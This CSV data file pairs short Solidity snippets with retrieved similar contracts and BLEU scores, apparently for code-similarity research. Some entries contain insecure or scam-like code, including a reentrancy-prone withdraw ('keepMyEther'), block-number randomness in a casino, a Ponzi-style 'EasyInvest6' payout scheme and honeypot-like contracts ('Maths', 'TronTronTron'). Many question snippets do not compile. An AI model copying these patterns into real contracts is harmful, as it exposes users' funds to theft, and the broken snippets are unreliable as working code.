sni,bleu,code
"contract Casino {


    uint minimumBet;
    uint totalBet;
    uint numberOfBets;
    uint maximumAmountsOfBets = 100;
    address[] players;

    struct Player {

        uint amountBet;
        uint numberSelected;
    }


    mapping(address => Player) playerInfo;


    address owner; 


    function Casino(uint _minimumBet) public{  
        

        owner = msg.sender;
        if(_minimumBet !=0) minimumBet = _minimumBet;

        }

        


    function bet(uint number) payable public {

        require(checkPlayerExists(msg.sender) );
        require(number >= 1 && number <= 10);
        require(msg.value >= minimumBet);


        playerInfo[msg.sender].amountBet = msg.value;
        playerInfo[msg.sender].numberSelected = number;
        numberOfBets += 1;
        players.push(msg.sender);
        totalBet += msg.value;

        if(numberOfBets >= maximumAmountsOfBets) generateNumberWinner();


        }



    function checkPlayerExists(address player) public view returns(bool) {

        for( uint i = 0 ; i < players.length; i++){
            if(players[i] == player) return true;
        }
        return false;
    }


    

    function generateNumberWinner() public{

        uint numberGenerated = block.number % 10 + 1; 

        distributePrizes(numberGenerated);
    }


    

    function distributePrizes(uint numberWinner) public {

        address[100] memory winners ; 

        uint count = 0; 

        for(uint i = 0; i < players.length ; i++) {
            address playerAddress = players[i];
            if(playerInfo[playerAddress].numberSelected == numberWinner){
                winners[count] = playerAddress;
                count ++;
            }
            delete playerInfo[playerAddress]; 


        }

        players.length = 0; 

        uint winnerEtherAmount = totalBet / winners.length; 

        for(uint j = 0; j < count; j++) {

            if(winners[j] !=address(0)) 
            winners[j].transfer(winnerEtherAmount);
        }


    }

    
    function() payable private{}



    function kill() private{ 

        if(msg.sender == owner)
            selfdestruct(owner);
    }
}",0.6517289724637416,"contract EasyInvest6 is Ownable

{   

    using SafeMath for uint;

    

    mapping (address => uint) public invested;

    mapping (address => uint) public lastInvest;

    address[] public investors;

    

    address private m1;

    address private m2;

    

    

    function getInvestorsCount() public view returns(uint) 

    {   

        return investors.length;

    }

    

    function () external payable 

    {   

        if(msg.value > 0) 

        {   

            require(msg.value >= 10 finney, ""require minimum 0.01 ETH""); 

            

            uint fee = msg.value.mul(7).div(100).add(msg.value.div(200)); 

            if(m1 != address(0)) m1.transfer(fee);

            if(m2 != address(0)) m2.transfer(fee);

        }

    

        payWithdraw(msg.sender);

        

        if (invested[msg.sender] == 0) 

        {

            investors.push(msg.sender);

        }

        

        lastInvest[msg.sender] = now;

        invested[msg.sender] += msg.value;

    }

    

    function getNumberOfPeriods(uint startTime, uint endTime) public pure returns (uint)

    {

        return endTime.sub(startTime).div(1 days);

    }

    

    function getWithdrawAmount(uint investedSum, uint numberOfPeriods) public pure returns (uint)

    {

        return investedSum.mul(6).div(100).mul(numberOfPeriods);

    }

    

    function payWithdraw(address to) internal

    {

        if (invested[to] != 0) 

        {

            uint numberOfPeriods = getNumberOfPeriods(lastInvest[to], now);

            uint amount = getWithdrawAmount(invested[to], numberOfPeriods);

            to.transfer(amount);

        }

    }

    

    function batchWithdraw(address[] to) onlyOwner public 

    {

        for(uint i = 0; i < to.length; i++)

        {

            payWithdraw(to[i]);

        }

    }

    

    function batchWithdraw(uint startIndex, uint length) onlyOwner public 

    {

        for(uint i = startIndex; i < length; i++)

        {

            payWithdraw(investors[i]);

        }

    }

    

    function setM1(address addr) onlyOwner public 

    {

        m1 = addr;

    }

    

    function setM2(address addr) onlyOwner public 

    {

        m2 = addr;

    }

}"
"contract Example {

    uint256 num;
    address parent;

    function Example(uint256 _num, address _parent) {
        num = _num;
        parent = _parent;
    }

    function createChild() {
        uint256 childNum = num + 1;
        Example child = new Example(childNum, this);
    }

    function getNumber() constant returns (uint256) {
        return num;
    }

    function getParentNumber() constant returns (uint256) {
        Example e = Example(parent);
        return e.getNumber();
    }

}",0.6130279626993026,"contract AthCrowdsaleInterface
{
    function investorsCount() public constant returns( uint256 );
    
    function investorsAddress( uint256 _i ) public constant returns( address );
    
    function investorsInfo( address _a ) public constant returns( uint256, uint256 );
    
    function investorsStockInfo( address _a ) public constant returns( uint256 );
    
    function getOwners(uint8) public constant returns( address );
}"
"contract TransferToken{
        function sendTheToken(address _from, address _to, uint256 _value)public returns(string) {
            address tokenContractAddress = <MyTokenaddress>
            MyToken token = MyToken (tokenContractAddress);
            bool sendSuccess = token.transferFrom(_from, _to, _value);
            if(sendSuccess=true) return 'success';
            else return 'Failure';
        }
    }",0.6248924233596456,"contract TokenERC20 {

	function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);

	function burnFrom(address _from, uint256 _value) public returns (bool success);

	mapping (address => mapping (address => uint256)) public allowance;

	mapping (address => uint256) public balanceOf;

}"
"contract StoreFactory {
  address[] private deployedStores;

  function createStore() public {
    deployedStores.push(new Store(msg.sender));
  }

  function getDeployedStores() public view returns (address[]){
    return deployedStores;
  }
}",0.6073997695747889,"contract DaoStakeStorage {

    mapping (address => uint256) public lockedDGDStake;



    function readLastModerator() public view returns (address);



    function readLastParticipant() public view returns (address);

}"
"contract calledContract {
    event callEvent(address sender, address origin, address from);
    function calledFunction() public {
        emit callEvent(msg.sender, tx.origin, this);
    }
}",0.6235813894928497,"contract ProxyEventsEmitter {
    function emitTransfer(address _from, address _to, uint _value);
    function emitApprove(address _from, address _spender, uint _value);
}"
"contract BankATM {

    enum Stages {
        ServingCustomer,
        Finished,
        Idle
    }

    address owner;

    mapping(address => uint256) balances;

    Stages public stage = Stages.ServingCustomer;

    constructor () payable public {
        owner = msg.sender;
    }

    modifier atStage(Stages _stage) {
        require(stage == _stage);
        _;
    }

    modifier transitionAfter() {
        _;
        nextStage();
    }

    modifier timedTransitions() {
        if (stage == Stages.ServingCustomer) {
            nextStage();
        }
        if (stage == Stages.Finished) {
            nextStage();
        }
        _;
    }

    function deposit(uint _amount) public payable timedTransitions atStage(Stages.ServingCustomer) {
        balances[msg.sender] += _amount;
    }

    function txFinished() public timedTransitions atStage(Stages.Finished) transitionAfter returns(uint) {
        return getBalance();
    }

    function idleNow() public view atStage(Stages.Idle) returns (uint) {
        return getBalance();
    }

    function getBalance() internal view returns (uint256){
        return balances[msg.sender];
    }

    function nextStage() internal {
        stage = Stages(uint(stage) + 1);
    }
}",0.6250039619097771,"contract MultiEthSender {



  uint256 constant private ethInWei = 10**18;

  mapping(address => uint256) private balance;

  address public owner;



  event Send(uint256 _amount, address indexed receiver);



  constructor() public payable {

    owner = msg.sender;

    balance[msg.sender] = msg.value;

  }



  function multiSendEth(uint256 amount, address[] list) public returns (bool) {

    uint256 amountInWei = amount * ethInWei;

    require(amountInWei * list.length <= balance[msg.sender], ""the contract balance is not enough"");

    for (uint256 i = 0; i < list.length; i++) {

      emit Send(amount, list[i]);

      uint256 res = balance[msg.sender];

      balance[msg.sender] = res - amountInWei;

      list[i].transfer(amountInWei);

    }

    return true;

  }



  function deposit() public payable returns (uint256) {

    balance[msg.sender] += msg.value;

    return balance[msg.sender];

  }



  function getBalance() public constant returns (uint256) {

      return balance[msg.sender];

  }



  function() public payable { }

}"
"contract F {
    uint public x;
    address addressE = 0x98789aD9797ad908097ad9870987DDD97897aD ;
    address public sender;

    function F() {
    }

    function setE(uint num) returns(bool) {
         x=num;
        return addressE.callcode('set(uint256)', num);
    }

    function getE() returns(uint) {
        return ?????????????;  
    }

}",0.6607822567792697,"contract Token {

  function transfer(address receiver, uint amount) public returns(bool);

  function transferFrom(address sender, address receiver, uint amount) public returns(bool);

  function balanceOf(address holder) public view returns(uint);

}"
"contract SignVerify {
    function recoverAddr(bytes32 msgHash, uint8 v, bytes32 r, bytes32 s) returns (address) {
        return ecrecover(msgHash, v, r, s);
    }

    function isSigned(address _addr, bytes32 msgHash, uint8 v, bytes32 r, bytes32 s) returns (bool) {
        return ecrecover(msgHash, v, r, s) == _addr;
    }
}",0.6109549301353883,"contract ENSReverseRegistrar {
    function claim(address _owner) public returns (bytes32);
    function claimWithResolver(address _owner, address _resolver) public returns (bytes32);
    function setName(string memory _name) public returns (bytes32);
    function node(address _addr) public pure returns (bytes32);
}"
"contract Bank {
    struct Client {
        uint deposit;
        bool active;
    }

    address owner;
    mapping(address => Client) public clientList;
    uint clientCounter;

    constructor() public payable {
        require(msg.value == 30 ether, ""Initial funding of 30 ether required for rewards"");
        
        owner = msg.sender;
        clientCounter = 0;
    }

    function enroll(address _addr) public {
        clientList[_addr].deposit = 0;
        clientList[_addr].active = true;
        clientCounter++;
    }

    function isClientActive(address _addr) public view returns(bool) {
        return clientList[_addr].active;
    }

    function getClientCounter() public view returns(uint) {
        return clientCounter;
    }

    
    function addDeposit() public payable {
        if (clientList[msg.sender].active != true) {
            revert(""the client's address does not exist"");
        } else {
            clientList[msg.sender].deposit += msg.value;
        }
    }

    
    function withdraw(uint amount) public payable {
        if (clientList[msg.sender].deposit < amount) {
            revert(""not enough deposit to make the withdraw"");
        } else {
            clientList[msg.sender].deposit -= amount;
            msg.sender.transfer(amount);
        }
    }

    
    function checkDeposit(address _addr) public view returns (uint) {
        return clientList[_addr].deposit;
    }

    
    function () public payable {
        if (!isClientActive(msg.sender)) {
            revert(""client does not exist"");
        } else {
            clientList[msg.sender].deposit += msg.value;
        }
    }
}",0.6462663080623835,"contract EventFactory{



    bool isStopped = false;



    address public owner = msg.sender;



    mapping (address => bool) registerSite;



    address[] public events;



    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }



    function () public payable {

        revert();

    }



    function stopContract() onlyOwner public {

        isStopped = true;

    }



    function resumeContract() onlyOwner public {

        isStopped = false;

    }



    function emergencyWithdraw() onlyOwner public {

        require(isStopped == true);

        owner.transfer(address(this).balance);

    }



    function destroyContract() onlyOwner public {

        require(isStopped == true);

        selfdestruct(owner);

    }



    function createEvent(string _siteName, string _eventName, uint totalTickets, uint defaultPrice) public returns (address) {

        Event newEvent = new Event(msg.sender, _siteName, _eventName, totalTickets, defaultPrice);

        events.push(newEvent);

        return newEvent;

    }



    function getEvents() public view returns (address[]) {

        return events;

    }



    function registerEventSite(address siteAddr) onlyOwner public {

        registerSite[siteAddr] = true;

    }



    function deleteEventSite(address siteAddr) onlyOwner public {

        registerSite[siteAddr] = false;

    }



    function isValid(address _siteAddr) public view returns (bool){

        if(registerSite[_siteAddr])

            return registerSite[_siteAddr];

        else

            return false;

    }

}"
"contract Example {

    uint32 public value;

    event ValueSet(uint);

    function setValue(uint32 val) {
        value = val;
        ValueSet(val);
    }

}",0.6067181179901986,"contract PriceOracle
{
    
    function tokenValue(address token, uint amount)
        public
        view
        virtual
        returns (uint value);
}"
"contract Basic {
    uint public data;

    function increase() {
        data = BasicLib.add(data, 10);
    }    
}",0.6124568072864611,"contract Data {
    mapping(address => uint256) public CftBalanceOf;
       function Data() public {
            }
}"
"contract Abstract {
    function foobar();
}",0.696067526719917,"contract ARITokenAbstract {
    function unlock();
}"
"contract B {
    uint stateVar;
    function foo(Abstract someAddress){
        someAddress.foobar();
    }
    function bar(uint x) {
        stateVar = x;
    } 
}",0.6064836343749735,"contract Token {
	function balanceOf(address addr) returns(uint);
	function transfer(address to, uint amount) returns(bool);
}"
"contract DappTokenSale {
       address admin;
       DappToken public tokenContract;

      function DappTokeSale(DappToken _tokenContract) public {

          admin = msg.sender;
}
    }",0.6060237443780416,"contract TokenProvider is Ownable {

  MintableToken public token;

  function setToken(address newToken) public onlyOwner {
    token = MintableToken(newToken);
  }

}"
"contract RegisterContract {

    uint public contractWeight;

    mapping(bytes32=>string) public contracts;
    bytes32[] public myHashes;

    function addContract ( string jsonInput, bytes32 hashKey) public {
        contracts[hashKey] = jsonInput;
        myHashes.push(hashKey);
     }

    function addWeight (uint weight) public {
        contractWeight = weight;
    }

    function () payable public {
    }
}",0.6300681389019186,"contract ContractResolver {

  address public owner;

  bool public locked;

  function init_register_contract(bytes32 _key, address _contract_address) public returns (bool _success);

  function unregister_contract(bytes32 _key) public returns (bool _success);

  function get_contract(bytes32 _key) public constant returns (address _contract);

}"
"contract BinaryTrading is usingOraclize {
  
  
  
  address minter;

  uint balance;

  string public ethusd;

  function BinaryTrading() {
    minter = msg.sender;
    oraclize_setProof(proofType_TLSNotary | proofStorage_IPFS);
  }

  
  function () payable {
    balance += msg.value;
  }

  function updatePrice(string newPrice) {
      ethusd = newPrice;
  }

  
  function __callback(bytes32 myid, string result, bytes proof) {
    if (msg.sender != oraclize_cbAddress()) throw;
    ethusd = result;
  }

  
  function getPairPrice() {
    bytes32 myid = oraclize_query(""URL"", ""json(https:
  }

}",0.6165969061401556,"contract I_Pricer {
    uint128 public lastPrice;
    uint public constant DELAY = 1 days;
    I_minter public mint;
    string public sURL;
    mapping (bytes32 => uint) RevTransaction;
    function setMinter(address _newAddress) {}
    function __callback(bytes32 myid, string result) {}
    function queryCost() constant returns (uint128 _value) {}
    function QuickPrice() payable {}
    function requestPrice(uint _actionID) payable returns (uint _TrasID){}
    function collectFee() returns(bool) {}
    function () {
        
        revert();
    }
}"
"contract SimpleStorage {

    uint public storedData;

    constructor(uint initVal) public {
        storedData = initVal;
    }

    function set(uint x) public returns (uint retVal) {
        storedData = x;
        return storedData;
    }

    function get() view public returns (uint retVal) {
        return storedData;
    }

}",0.6198280178031716,"contract Uint256HashTable {

    mapping(uint256 => uint256) public hashTableValues;



    constructor() public {



    }



    function set(uint256 key, uint256 value) public  {

        hashTableValues[key] = value;

    }



    function get(uint256 key) public view returns (uint256 retVal) {

        return hashTableValues[key];

    }

}"
"contract AutomatedWealthRedistribution is Coin {
    address owner;
    uint fixedSupply;
    function supplyRatio() returns(uint) { fixedSupply/totalSupply };

    function getBalance(address _entity) returns(uint) {
        return balanceOf[_entity]*supplyRatio();
    }
    function tax(address _to, uint _tax) {
        balanceOf[_to]+= totalSupply*_tax;
        totalSupply += totalSupply*_tax;
    }
    function payment(address _to, uint _amount) {
         transfer(_to, _amount/supplyRatio());
    }
}",0.6400489045776663,"contract IToken {
    function mint(address _to, uint _amount);
    function start();
    function getTotalSupply() returns(uint);
    function balanceOf(address _owner) returns(uint);
    function transfer(address _to, uint _amount) returns (bool success);
    function transferFrom(address _from, address _to, uint _value) returns (bool success);
    function burn(uint256 _amount, address _address)  returns (bool success);
}"
"contract Aa {

    uint public myuint;

    function set(uint _var) public {
            require(_var == 5 || 99, ""Not 5 or 99!"");
        myuint = _var;
    }

    function get() public view returns (uint){
        return myuint;
    }
}",0.6523946642292393,"contract FeeInterface {
    function rateOf (address token) public view returns (uint);
    function takeFee (uint amt, address token) public view returns (uint fee, uint remaining);
}"
"contract Test {
    Token public token;
    constructor () {
        token = new Token(""Test"", ""TST"", 18);
        token.mint(msg.sender, 10000);
    }

    function call(address _to, uint256 _value) returns (bool) {
       return  address(token).delegatecall(bytes4(sha3('transfer(address, uint256)')), _to, _value);
    }
}",0.6802620063538221,"contract StandardToken  {
  function balanceOf(address who) constant public returns (uint256);
  function transfer(address to, uint256 value) public returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
}"
"contract Bar {
    struct Foo{
        uint x;
    }
    mapping(address => Foo[]) foo;

    function add(address id, uint _x) public {
        foo[id].push(Foo(_x));
    }

    function get(address id, uint index) view public returns(uint){
        return foo[id][index].x;
    }
}",0.6710513912638116,"contract ERC20Basic {
  function balanceOf(address who) public constant returns (uint);
  function transfer(address to, uint value) public;
  event Transfer(address indexed from, address indexed to, uint value);
}"
"contract AddressContract {
    string private myAddress;
    function getAddress() public returns (string) {
        return myAddress;
   }
}",0.6715697417960924,"contract MyContract {
  string word = ""All men are created equal!"";

  function getWord() returns (string){
    return word;
  }

}"
"contract A { 
    address owner;  

    function A() { 
        owner = msg.sender; 
    }

    function useB() returns (bool){ 
        B b = new B(msg.sender);
        if (!b.call.value(msg.value)(bytes4(sha3(""deposit()"")))) { throw; } 
        return true;

}
}",0.6457909628524338,"contract owned {
    address public owner;
    
    function owned() {
        owner = msg.sender;
    }
    
    function setOwner(address _new) onlyOwner {
        owner = _new;
    }
    
    modifier onlyOwner {
        if (msg.sender != owner) throw;
    }
}"
"contract B { 
    address owner;
    address controllingContract;
    uint balance;

    modifier onlyOwner {
        if (msg.sender != owner) { throw; } 
        _;
    }
    modifier controlledContract {
        if (msg.sender != controllingContract) { throw; }
        _;
    }

    function B(address _owner) {
        controllingContract = msg.sender; 
        owner = _owner; 
    }
    function deposit() controlledContract{
        balance += msg.value; 
    }
    function updateContract(address _updatedContract) onlyOwner { 
        controllingContract = _updatedContract; 
    }
}",0.6467303807707283,"contract OnlyOwner {
  address public owner;
  address private controller;
  event Controller(address _user);
  
  constructor() public {
    owner = msg.sender;
    controller = owner;
  }


  
  modifier isOwner {
    require(msg.sender == owner);
    _;
  }
  
  
  modifier isController {
    require(msg.sender == controller);
    _;
  }
  
  function replaceController(address _user) isController public returns(bool){
    require(_user != address(0x0));
    controller = _user;
    emit Controller(controller);
    return true;   
  }

}"
"contract Pay {
    event Payment(
        address _from,
        address _to,
        uint amount
    );

    
    
    function pay(address _to) public payable {
        require(msg.value > 0);
        _to.transfer(msg.value);
        Payment(msg.sender, _to, msg.value);
    }
}",0.6599875827412831,"contract ERC223 {
    function transfer(address to, uint value, bytes data) public;
    event Transfer(address indexed from, address indexed to, uint value, bytes indexed data);
}"
"contract Adoption {

struct Dog {
    uint age;
    string name;
}

Dog[] public dogs;

function createDog(uint _age, string _name) public {
    dogs.push(Dog(_age, _name)) - 1;
}        ",0.6549983970290895,"contract TestContract {
    string name;
    function getName() public constant returns (string){
        return name;
    }
    function setName(string newName) public {
        name = newName;
    }
}"
"contract A {

    address owner;
    function A() { owner = msg.sender; }

}",0.6734893460043776,"contract IOwned {
	function owner() public pure returns (address) {}
}"
"contract SendEther {
    address public creator= msg.sender;
    uint256 public sendcount; 
        function sendViaCall (address payable _to) public payable {
            require(msg.sender == creator);
            (bool sent, bytes memory data) = _to.call.value(msg.value)("""");
            require (sent, ""failed to send ether"");
            require(sendcount < 1);
                 sendcount++;
    }
}",0.6409536333155798,"contract Wallet {
    address payable public owner;
    
    constructor() public payable {
        owner = msg.sender;
    }
    
    modifier OnlyOwner {
        require(msg.sender == owner);
        _;
    }
    
    function topup() public payable {
        
    }
    
    function withdraw(address payable to, uint256 value) public OnlyOwner {
        to.transfer(value);
    }

    function () external payable{}
}"
"contract MyContract {
    event MyEvent(address indexed sender, uint256 input, uint256 output);

    function func(uint256 input) external {
        verify(msg.sender);
        uint256 output = compute(input);
        emit MyEvent(msg.sender, input, output);
    }

    function verify(address sender) private view {
        
        ...
    }

    function compute(uint256 input) private returns (uint256) {
        
    }
}",0.6196437983644357,"contract PoSTokenStandard {
    uint256 public stakeStartTime;
    uint256 public stakeMinAge;
    uint256 public stakeMaxAge;
    function mint() public returns (bool);
    function coinAge() public view returns (uint256);
    function annualInterest() public constant returns (uint256);
    event Mint(address indexed _address, uint _reward);
}"
"contract Storage {
  uint256 storedData;

  event print(uint256 store);

  function set(uint256 data) public {
    emit print(data);
    storedData = data;
  }

  function get() constant returns (uint256) {
    return storedData;   
  }
}",0.6474104844304217,"contract PoSTokenStandard {

    uint256 public stakeStartTime;

    function mint() public returns (bool);

    function coinAge() public constant returns (uint256);

    event Mint(address indexed _address, uint _reward);

}"
"contract Deployer {
  function deploy() {
    address nc = new NewContract();
  }
}",0.6495705101622042,"contract Contract {function pegHandler( address _from, uint256 _value );}"
"contract B is Owned  {
  address parent;
  function B() {
    parent = msg.sender;
  }  
}",0.6737638416271486,"contract Ownable {
  address  owner;
  function Ownable() {
    owner = msg.sender;
  }
}"
"contract Verifications is Initializable { 

  mapping (bytes32 => bytes32) public data;
  address public owner;

  function initialize(bytes32[] _data) initializer public {
    owner = msg.sender;
    data = _data;
  }
}",0.6913676459924354,"contract MyMap {
    address public owner;
    mapping(bytes32=>bytes15) map;

    function MyMap() public {
        owner = msg.sender;
    }
    
    function setValue(bytes32 a, bytes15 b) public {
        if(owner == msg.sender) {
            map[a] = b;
        }
    }
}"
"contract Coursetro {

   string fName;
   uint age;

   event Instructor(
       string name,
       uint age
    );

   function setInstructor(string _fName, uint _age) public {
       fName = _fName;
       age = _age;
       Instructor(_fName, _age); 
   }
}",0.6082594147315998,"contract ProofOfLove {

    

    uint public count = 0;



    event Love(string name1, string name2);



    constructor() public { }



    function prove(string name1, string name2) external {

        count += 1;

        emit Love(name1, name2);

    }



}"
"contract Some {
   function () payable {
      withdraw();
   }
   function withdraw(){}

   function paybaleFunction() payable{
      withdraw();
   }
}",0.6184912302636925,"contract EtherToken is Token {

    
    function deposit()
        public
        payable
    {}

    
    
    function withdraw(uint amount)
        public
    {}
}"
"contract ApprovalContract {
address public sender;
address public receiver;

address public constant approver = 0x5AEDA56215b167893e80B4fE645BA6d5Bab767DE;

constructor() public {

}
function deposit(address _receiver) external payable {
    require(msg.value > 0);
    sender = msg.sender;
    receiver = _receiver;
}

function viewApprover() external pure returns(address){
    return(approver);
}

function viewRe() external pure returns(address){
    return(receiver);
}


function approve() external payable{
    require(msg.sender == approver);

    receiver.transfer(address(this).balance); 

}
}",0.6377035873913266,"contract TronTronTron

{

    address  sender;

    address  receiver;

    uint  unlockTime;

    bool  closed = false;

    

 

    function PutGift(address _receiver) public payable {

        if( (!closed&&(msg.value >0.10 ether)) || sender==0x0 ) {

            sender = msg.sender;

            receiver = _receiver;

            unlockTime = now;

        }

    }

    

    function SetGiftTime(uint _unixTime) public {

        if(msg.sender==sender) {

            unlockTime = _unixTime;

        }

    }

    

    function GetGift() public payable {

        if(receiver==msg.sender&&now>unlockTime) {

            msg.sender.transfer(address(this).balance);

        }

    }

    

    function CloseGift() public {

        if (receiver!=0x0) {

           closed=true;

        }

    }

    

    function() public payable{}

}"
"contract Tester {

  struct Account {
    uint256 balance; 
  }

  mapping (address => Account) public accounts;

  function addBalance() public payable {
    Account storage a = accounts[msg.sender];
    a.balance = a.balance + msg.value;

  }


}",0.6289940310251165,"contract keepMyEther {
    mapping(address => uint256) public balances;
    
    function () payable public {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw() public {
        msg.sender.call.value(balances[msg.sender])();
        balances[msg.sender] = 0;
    }
}"
"contract test {

    address public receiver;
    uint public amount;

    function test(address _receiver, uint _amount) public {
        receiver = _receiver;
        amount = _amount;
    }

    function () public {
        receiver.transfer(amount);
        }
}",0.6704371095581426,"contract TokenController {

        function onTransfer(address _from, address _to, uint _amount) public returns(bool);

        function onApprove(address _owner, address _spender, uint _amount) public returns(bool);
    }"
"contract B { 
  function set() {} 
  function f() { 
    set(); 
  } 
}",0.6578338234415219,"contract DummyReceiver {

    
    function start() {
    }

    
    function end() {
    }
}"
"contract A is B { 
   function set() { }
}",0.6816128555409892,"contract test {
    function f() public { }
}"
"contract Greeter {

    function Greeter() {

    }

    function sayHello() returns(string) {
        return ""hello"";
    }
}",0.6581391214632802,"contract HelloWorld {
    
    function getData() constant returns (string) {
        return ""Hello, world!"";
    }
    
}"
"contract HelloWorld {
    uint public balance;

    constructor() public {
        balance = 1000;
    }

    function deposit(uint _value) constant public returns (uint _newValue) {
        balance += _value;
        return balance;
    }

    function get() constant public returns (uint) {
        return balance;
    }
}",0.6908134699624183,"contract tokenInterface {
	function balanceOf(address _owner) public constant returns (uint256 balance);
	function transfer(address _to, uint256 _value) public returns (bool);
	string public symbols;
	function originBurn(uint256 _value) public returns(bool);
}"
"contract C {

event EventAdd_One(int a, int b);

event EventAdd_Two(int a, int b);

function add(int a, int b) returns (int) {

    
    EventAdd_One(a, b);

    if (a > 0 && b > 0) {
        return a + b;
        
        EventAdd_Two(a, b);
    } else return 0;
}

}",0.6458189617356961,"contract SafeMath {

    function safeAdd(uint a, uint b) internal returns (uint) {

        uint c = a + b;

        assert(c>=a && c>=b);

        return c;

     }



    function safeSub(uint a, uint b) internal returns (uint) {

        assert(b <= a);

        return a - b;

    }

}"
"contract TransactionOrdering { 
 uint256 price; address owner; 

 function buy(uint256 amount) {
   cost = price * amount       
   return cost;                
 }                             

  function setPrice(uint256 _price) {
    
    if (msg.sender == owner)         
      price = _price;                
  }                                  
}",0.6347486059774491,"contract RoseCoin {
    
    function balanceOf(address _owner) constant returns (uint256);
    
    function transfer(address _to, uint256 _value) returns (bool success);
    
    function buy() payable returns (uint256 amount);
}"
"contract Buyer {
        
        uint  amount;
        mapping (address => uint) balances;

    function send(address receiver, uint amount) {
        if (balances[msg.sender] < amount) return;
            
                balances[msg.sender] -= amount;
                balances[receiver] += amount;
                
            
    }

   function getAmount() returns(uint) {
        return(amount);
    }

}",0.6744059296293319,"contract ERC20 { 
    function transfer(address receiver, uint amount) public ;
    function transferFrom(address sender, address receiver, uint amount) public returns(bool success); 
    function balanceOf(address _owner) constant public returns (uint256 balance);
}"
"contract Seller{
        string description;

        Buyer bartscontract;

        function SetDescription(string _description) public {
            description = _description;
            
        }
        function getDescription() constant public returns(string) {
            return description;
        }




    }",0.6113251984426893,"contract SaveString{

    constructor() public {

    }

    mapping (uint=>string) data;

    function setStr(uint key, string value) public {

        data[key] = value;

    }

    function getStr(uint key) public constant returns(string){

        return data[key];

    }

}"
"contract CA4 {


mapping(address=>uint16) public balances;

function getBalance() view returns (uint16) {
uint16 mybalance = balances[msg.sender];
return mybalance;
}

function setBalance(uint16 newbalance) public {
balances[msg.sender]=newbalance;
}


}",0.6356754750879177,"contract XDT is DataeumToken {

  mapping(address => uint256) balances;

  function transfer(address destination, uint256 amount) public returns (bool success);

  function balanceOf(address tokenOwner) public view returns (uint balance);

}"
"contract Escrow {

address public buyer;
address public seller;
address public arbiter;

  function Escrow(address _seller, address _arbiter) {
    buyer = msg.sender;
    seller = _seller;
    arbiter = _arbiter;
}

  function payoutToSeller() {
    if(msg.sender == buyer || msg.sender == arbiter) {
      seller.send(this.balance);
    }
}

  function refundToBuyer() {
    if(msg.sender == seller || msg.sender == arbiter) {
      buyer.send(this.balance);
    }
  }

  function getBalance() constant returns (uint) {
    return this.balance;
  }
}",0.6426099888782236,"contract BitcoinBravado {

    

    address public owner;

    

    mapping(address => bool) paidUsers;

    

    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }

    

    function BitcoinBravado() public {

        owner = msg.sender;

    }

    

    function payEntryFee() public payable  {

        if (msg.value >= 0.1 ether) {

            paidUsers[msg.sender] = true;

        }

    }

    

    function getUser (address _user) public view returns (bool _isUser) {

        return paidUsers[_user];

    }

    

    function withdrawAll() onlyOwner() public {

        owner.transfer(address(this).balance);

    }

}"
"contract Election {
  
  string public candidate;

  
  function Election () public {
   candidate = ""Candidate 1"";
  }
 }",0.6011060309882487,"contract Foo
{
    string public phrase;
    
    function Foo(string _phrase) public {
        phrase = _phrase;
    }
}"
"contract C {
    bytes1 b10 = 0x6c;
    bytes1 b11 = 0x69;

    function test1() constant returns (bytes1) {
        return b10 & b11; 

    }

    function test2() constant returns (bytes1) {
        return b10 | b11; 
         
         
        
    }

    function test3() constant returns (bytes1) {
        return ~b10;  
         
         
    }

    **function test4() constant returns (bytes1) {
        return b10 << 1;  
         
         
    }
    function test5() constant returns (bytes1) {
        return b10 >> 1;  
         
         
    }**

}",0.6038586964196407,"contract myTime is mortal
{
    uint deployTime;

    
    function myTime() public
    {
        deployTime = block.timestamp;
    }

    function getBlockNumber() constant returns (uint)
    {
        return block.number;
    }

    function getDeployTime() constant returns (uint)
    {
        return deployTime;
    }

    function getBlockTime() constant returns (uint)
    {
        return block.timestamp;
    }

    function getNowTime() constant returns (uint)
    {
        return now;
    }
}"
"contract SimpleTokenAttack {
    SimpleToken public victim;

    function SimpleTokenAttack(address _addr) public {
        victim =  SimpleToken(_addr);
    }

    function buy() public returns(bool) {
        
    }

    function send() public returns(bool) {
        
    }
}",0.6592808835631327,"contract POOH
{
    function buy(address) public payable returns(uint256);
    function exit() public;
    function myTokens() public view returns(uint256);
    function myDividends(bool) public view returns(uint256);
}"
"contract Test {
    uint x;

    function Test() { 
        x = 0;
    }

    function inc() returns (uint) { 
        x = x + 1;
        return x;
    }

    function get() returns (uint) { 
        return x;
    }
}",0.683019817191965,"contract SaiTap {
    function s2s() public returns (uint);
    function bid(uint wad) public returns (uint);
    function ask(uint wad) public returns (uint);
}"
"contract Builder {
    function create(uint8 amount) public returns (address[]) {
        uint8 i = 0;
        address[] contracts;
        while (i++ < amount) {
           address[i] = new One();
        }
        return contracts;
    }
}",0.6566615169357573,"contract TokenVault is Ownable {
    function withdrawTokenTo(address token, address to, uint amount) public onlyOwner returns (bool) {
        return Token(token).transfer(to, amount);
    }
}"
"contract MyContract {
    address public token;

    address payable wallet;

    constructor(address payable _wallet, address _token) public {
        wallet = _wallet;
        token = _token;
    }
    function() external payable{
       buyToken();
    }
    function buyToken() public payable {
        ERC20Token _token = ERC20Token(address(token));
        _token.mint();
        wallet.transfer(msg.value);
    }
}",0.6831053871560929,"contract Sale is AbstractSale {
    ERC20 public token;

    function Sale(address _token) public {
        token = ERC20(_token);
    }

    function doPurchase(address buyer, uint256 amount) internal {
        token.transfer(buyer, amount);
    }

    
    function verifyCanWithdraw(address _token, address _to, uint256 _amount) internal {
        require(_token != address(token));
    }
}"
"contract TheContract {
    address public mateAddress = OxA

    function () payable public {
        if (msg.sender == mateAddress) {
            
        }
    }

    function checkStatus() {
        if (someCondition) {
            address myAddress = this;
            mateAddress.send(myAddress.balance);
        }
    }
}",0.6286109649429457,"contract Maths

{

    address Z = msg.sender;

    function() public payable {}

    function X() public { if (msg.sender==Z) selfdestruct(msg.sender); }

    function Y() public payable { if (msg.value >= this.balance) msg.sender.transfer(this.balance); }

 }"
"contract NullFunction {
  function ccccvKygDv() public pure { }
}",0.6330297391890078,"contract Nonpayable {

  
  
  
  function () public payable {
    revert();
  }
}"
"contract school {
    address public owner;
    address[] public teachers;

    mapping(uint => Class) public classes;

    struct Class {
        uint id;
        address teacher;
        address[] pupils;
    }

    constructor() public{
        owner = msg.sender;
    }

    function addTeacher(address _address) public {
        require(msg.sender == owner);
        teachers.push(_address);
    }

